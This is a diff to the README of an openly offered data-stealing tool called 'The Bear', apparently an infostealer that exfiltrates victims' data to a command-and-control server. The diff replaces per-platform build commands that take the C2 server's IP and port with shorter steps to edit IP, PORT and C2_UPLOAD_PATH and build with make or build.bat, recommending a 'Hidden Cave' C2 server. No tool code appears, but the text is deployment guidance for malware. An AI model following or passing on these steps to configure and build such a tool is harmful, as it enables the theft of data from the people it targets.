@@ -33,25 +33,12 @@ Unlike traditional infostealers, The Bear functions more as a data exfiltration 
 
 ## Build
 
-Before building The Bear executable, ensure the following prerequisites are installed:
+Before building The Bear, ensure the following prerequisites are installed:
 - **Python.**
 - **GNU compiler collection.**
 
-### Linux
-1. Open a terminal in the project directory.
-2. Run the following command, replacing `<ip>` and `<port>` with the C2 server's IP and port:
-    ```bash
-    make port=<ip> ip=<port>
-    ```
-    This will compile the project and create an executable in the "bin" folder.
-
-### Windows
-1. Download and install the GNU Compiler Collection (GCC) for Windows from [winlibs](https://winlibs.com/#download-release). Ensure to add the installation directory to your system path environment variable during installation.
-2. Open a command prompt in the project directory.
-3. Run the following command, replacing `<port>` and `<ip address>` with the C2 server's IP and port where its accessable:
-    ```cmd
-    build.bat <port> <ip address>
-    ```
+1. Edit the IP and PORT and C2_UPLOAD_PATH, if you are willing to use the [Hidden Cave](https://github.com/yo-aiv1/hiddencave) C2 server you dont need to edit the C2_UPLOAD_PATH just leave it as it is.
+2. depending on your operation system run either make for linux or build.bat for windows.
 
 ## C2_server
 
